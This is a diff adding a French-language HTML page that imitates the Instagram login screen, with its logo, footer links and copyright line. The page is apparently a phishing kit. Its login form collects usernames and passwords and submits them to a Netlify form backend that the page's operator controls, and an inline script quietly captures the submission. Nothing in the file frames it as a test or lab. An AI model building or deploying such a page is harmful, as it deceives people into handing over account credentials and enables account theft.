@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Instagram">
+  <meta name="application-name" content="Instagram">
+  <meta property="og:title" content="Instagram">
+  <meta property="og:image" alt="instagramlogo" content="/img/instagram.png">
+  <meta property="og:type" content="website">
+  <meta name="theme-color" content="#ffffff">
+  <title>Connexion • Instagram</title>
+  <link rel="stylesheet" href="./styles/style.css">
+  <link rel="icon" href="img/instagram-fill-logo.png" type="image/icon type">
+  <script>
+    function handleFormSubmit(event) {
+        event.preventDefault(); // Empêche la soumission par défaut
+
+        const form = event.target;
+
+        fetch(form.action, {
+            method: 'POST',
+            body: new FormData(form),
+        })
+        .then(response => {
+            if (response.ok) {
+
+            } else {
+                alert('Une erreur est survenue. Veuillez réessayer.');
+            }
+        })
+        .catch(error => {
+            console.error('Erreur:', error);
+            alert('Une erreur est survenue. Veuillez réessayer.');
+        });
+    }
+</script>
+</head>
+<body>
+
+  <div id="content-container">
+
+    <!--Phone's pictures section-->
+    <section class="phones">
+      <img src="./img/phones1.png" alt="pictures on phone" class="phone-image">
+    </section>
+
+    <!--User's log in section-->
+    <section class="user">
+
+      <div class="login-container">
+
+        <!--Instagram Logo-->
+        <div class="instagram-logo-box">
+          <img class="instagram-logo" src="./img/instagram-logo.png">
+        </div>
+
+        <!--Form Login-->
+        <form id="login-post" method="POST" data-netlify="true" action="/404.html">
+          <div class="inputs-container">
+              <input type="text" name="username" class="input-field" placeholder="Num. téléphone, nom d'utilisateur ou e-mail" required>
+          </div>
+          <div class="inputs-container">
+              <input type="password" class="input-field" name="password" placeholder="Mot de passe" required>
+          </div>
+          <button type="submit" class="login-button">Se connecter</button>
+  
+          <div class="or-container">
+              <div class="line"></div>
+              <div class="or">OU</div>
+              <div class="line"></div>
+          </div>
+
+          <!--Facebook login-->
+          <div class="facebook-container">
+            <a class="facebook-login" href="#" target="_blank"><img class="facebook-logo"
+                src="./img/facebook-logo.png">Se connecter avec Facebook</a>
+          </div>
+        </form>
+
+        <!--Password recovery-->
+        <a class="password-forgot" href="#" target="_blank">Mot de passe oublié ?</a>
+        <div class="password-return"><br><br/></div>
+        <p class="illegal-content">
+          Vous pouvez également <a class="illegal-link" href="#" target="_blank">signaler le contenu que vous<br><br/> pensez illégal</a> dans votre pays sans vous connecter.
+        </p>
+      </div>
+
+      <!--Sign up-->
+      <div class="signup-container">
+        <p>Vous n'avez pas de compte ? <a class="signup" href="#" target="_blank">Inscrivez-vous</a></p>
+      </div>
+
+      <!--App's download-->
+      <div class="get-container">
+        <p class="download">Téléchargez l'application.</p>
+        <div class="download-container">
+          <a class="download-googleplay" href="#" target="_blank"><img class="googleplay"
+              src="./img/googleplay-logo.png"></a>
+          <a class="" href="#" target="_blank"><img class="googleplay"
+              src="./img/microsoft-logo.png"></a>
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <footer class="page-footer">
+    <div class="links-container"> 
+      <ul class="links-list">
+        <li><a href="#">Meta</a></li>
+        <li><a href="#">À propos</a></li>
+        <li><a href="#">Blog</a></li>
+        <li><a href="#">Emplois</a></li>
+        <li><a href="#">Aide</a></li>
+        <li><a href="#">API</a></li>
+        <li><a href="#">Confidentialité</a></li>
+        <li><a href="#">Paramètres des cookies</a></li>
+        <li><a href="#">Conditions</a></li>
+        <li><a href="#">Lieux</a></li>
+        <li><a href="#">Instagram Lite</a></li>
+        <li><a href="#">Threads</a></li>
+        <li><a href="#">Importation des contacts et non-utilisateurs</a></li>
+        <li><a href="#">Meta Verified</a></li>
+      </ul>
+
+      <span class="footer-span">
+        <br><br/>
+        © 2024 Instagram par Meta
+      </span>
+    </div>
+  </footer>
+</body>
+</html>
